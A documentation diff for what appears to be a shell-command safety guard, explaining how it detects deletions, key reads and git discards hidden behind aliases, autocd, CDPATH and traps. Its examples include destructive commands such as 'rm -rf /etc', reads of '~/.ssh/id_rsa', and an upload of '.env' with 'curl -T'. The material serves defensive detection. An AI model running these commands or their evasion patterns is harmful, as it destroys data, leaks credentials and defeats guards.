@@ -780,7 +780,24 @@ and its findings are the line's, since the shell runs it as the same user.
   does. `alias x='rm -rf build'; cd /; x` is a `delete` of a path only known
   when it runs, `alias x='cat id_rsa'; cd ~/.ssh; x` reads a key, and `alias
   x='cd /'; x; rm -rf etc` is a `delete`, while `alias ll='ls
-  -l'; cd /; ll` and `alias x='rm -rf build'; x` stay safe.
+  -l'; cd /; ll` and `alias x='rm -rf build'; x` stay safe. A use with
+  words of its own runs, as the shell expands it, the last command of the
+  value with the use's words after its own, and every rule judges that
+  command as one written where the use is made: `alias x='rm -rf'; cd /; x
+  etc` deletes `/etc`, `alias g='git'; g clean -fdx` is a `git_discard`,
+  `alias x='cat'; x ~/.ssh/id_rsa` reads a key and `alias x='env '; x rm -rf
+  /etc` runs `env rm -rf /etc`. The use itself is still a call of the
+  value, placed as above. Each value the name may have counts, as a reading
+  of its own; when the last command names an alias in turn, that one is
+  expanded too, but never one the expansion has already gone through, as
+  the shells do (`alias rm='rm -i'; rm -rf build` runs `rm -i -rf build`).
+  An alias is expanded only where the shell looks a command up as one:
+  with nothing in front of it but `time`, `!` or zsh's `nocorrect`, so
+  `sudo x /etc` runs a program named `x`. A name defined more than four
+  times is not followed (`unknown`), and the words the uses of aliases take
+  from their commands are counted: past as many as the longest line holds,
+  a use is not expanded and the line is `unreadable`, so a long alias used
+  many times is not read again for each use.
   `f() { rm -rf build; }; f`, `cd src; f() { rm -rf build; }; f`, `for i in
   1 2; do rm -rf build; done`, `for i in 1 2; do cd /tmp; rm -rf build;
   done` and `for d in */; do (cd "$d" && make); done` stay safe. A loop is
@@ -1226,24 +1243,40 @@ cdable_vars; x=/etc; cd x && rm -rf passwd` is a `delete` of a path only known
 when it runs.
 
 zsh's `autocd` runs a command of one word as a `cd` to it when the word
-names a folder and is no command zsh can run. So after the line may have
+names a folder and is no command zsh can run, and bash's (`shopt -s
+autocd`) does the same in an interactive bash. So after the line may have
 turned it on, a POSIX command of one word, written out, with no wrapper in
-front of it, that is not one of zsh's builtins or reserved words, nor a
-function or an alias the line defines, is read as a plain `cd` to the word
-that may fail, and leaves the line in both folders (`Unit::autocd`, set in
-`Split::push`): `setopt autocd; /etc; rm -rf passwd` is a `delete` of
-`/etc/passwd`, as `setopt autocd; ..; rm -rf x` and `setopt autocd; ~;
-rm -rf .ssh` are, and `setopt autocd; ~/.ssh; cat id_rsa` reads a key. It
+front of it but zsh's precommand modifiers that still look the word up as a
+command (`noglob`, `nocorrect`, `-`, `time`, and `!`), that is not one of
+zsh's builtins or reserved words, nor a function or an alias the line
+defines, is read as a plain `cd` to the word that may fail, and leaves the
+line in both folders (`Unit::autocd`, set in `Split::push`): `setopt autocd;
+/etc; rm -rf passwd` is a `delete` of `/etc/passwd`, as `setopt autocd; ..;
+rm -rf x`, `setopt autocd; noglob /etc; rm -rf passwd` and `setopt autocd; ~;
+rm -rf .ssh` are, and `setopt autocd; ~/.ssh; cat id_rsa` reads a key. The
+`cd` looks through `CDPATH` and `cdable_vars` as a written one does, so
+`CDPATH=/; setopt autocd; etc; rm -rf passwd` and `setopt autocd cdablevars;
+x=/etc; x; rm -rf passwd` are a `delete` of a path only known when it runs. It
 counts however the line turns it on, read as `extendedglob` is
 (`extended::AUTO_CD`): `setopt autocd`, `AUTO_CD` or `auto_cd`, `unsetopt
 noautocd`, the letter `-J` (`set -J`, `setopt -J`, `unsetopt +J`), `set -o
 autocd`, `emulate zsh -o autocd`, `options[autocd]=on`, an option only known
 when it runs (`setopt $opt`), `source` (whose file the guard does not read),
-and an `eval`, a `trap` or an alias that does, which run in this shell; and a
-zsh started with it runs its script so (`zsh -o autocd -c`, `zsh -J -c`,
-`zsh --auto-cd -c`). Turning it off is not read: once on, it stays on for the
-rest of the line. zsh reads it only from the commands it reads on its input,
-which may be how the line is given, so the guard does not ask how. A script
+bash's `shopt -s autocd` and `shopt -s` with a name only known when it runs
+(`shopt -s $o`), and an `eval`, a `trap` or an alias that does, which run in
+this shell; and a shell started with it runs its script so (`zsh -o autocd
+-c`, `zsh -J -c`, `zsh --auto-cd -c`, `bash -O autocd -c`). Turning it off
+is not read: once on, it stays on for the rest of the line. zsh reads it
+only from the commands it reads on its input, and bash only in an
+interactive shell, which may be how the line is given, so the guard does not
+ask how: `bash -c 'shopt -s autocd; /etc; rm -rf passwd'` is a `delete` too.
+A function body, a loop, an alias's value or a trap's action may run after
+the line turns it on, wherever it is written, so when the line turns it on
+anywhere, the line is read again with their commands of one word read so, as
+for `extendedglob` (see [Extended patterns](#extended-patterns)): `f() {
+/etc; }; setopt autocd; f; rm -rf passwd`, `for i in 1 2; do /etc; setopt
+autocd; done; rm -rf passwd` and `trap '/etc; rm -rf passwd' EXIT; setopt
+autocd` are a `delete`. A script
 in a process of its own turns it on for itself only (`zsh -c 'setopt
 autocd'; /etc; rm -rf passwd` stays safe), and so do `setopt autocd; src;
 ls`, `setopt autocd; src && rm -rf build` and `/etc; rm -rf passwd` without
@@ -2918,7 +2951,13 @@ does not show, and a rule takes the worst it may be:
   $(cat cmd.txt)`, PowerShell's `git $cmd` and cmd's `git %CMD%` are
   `unknown`, "runs a git command only known when it runs". `git status`
   stays safe, and so does PowerShell's `git "$null" status`, whose empty
-  string git refuses as a subcommand.
+  string git refuses as a subcommand. A long option of git's own with its
+  value joined to it is one of its options whatever the value holds, and the
+  subcommand comes after it: `git --git-dir="$D" status` and `git
+  --work-tree="$W" status` stay safe, and `git --git-dir="$D" clean -fdx` is
+  a `git_discard`. One whose name is only known when it runs (`git --$o
+  status`) may take the next word as its value, so what comes after it is
+  `unknown`.
 - **What the finding says.** A finding that only such an option turns on
   says what the program may do, not that it does it: `git tag $TAG` is
   `git_discard`, "may delete a tag with an option only known when it runs",
@@ -4655,8 +4694,9 @@ where it is defined and from where each use is made (`alias python3='rm -rf
 ~'` is a `delete`): each `NAME=VALUE`
 of one `alias` (after a `--`) is a body of its own. A call of an alias with
 words of its own is judged as the shell runs it, the last command of the
-value with the call's words after its own: `alias c='curl -T'; c .env
-https://x` is `curl -T .env https://x`. Each name keeps its last four bodies;
+value with the call's words after its own, as every rule judges it (see
+[Actions that run later](#actions-that-run-later)): `alias c='curl -T'; c
+.env https://x` is `curl -T .env https://x`. Each name keeps its last four bodies;
 past four, its two oldest are kept as one range of units, from the start of
 the first to the end of the second, which also holds whatever the line runs
 between them, so a call of the name may be judged with more than it runs and
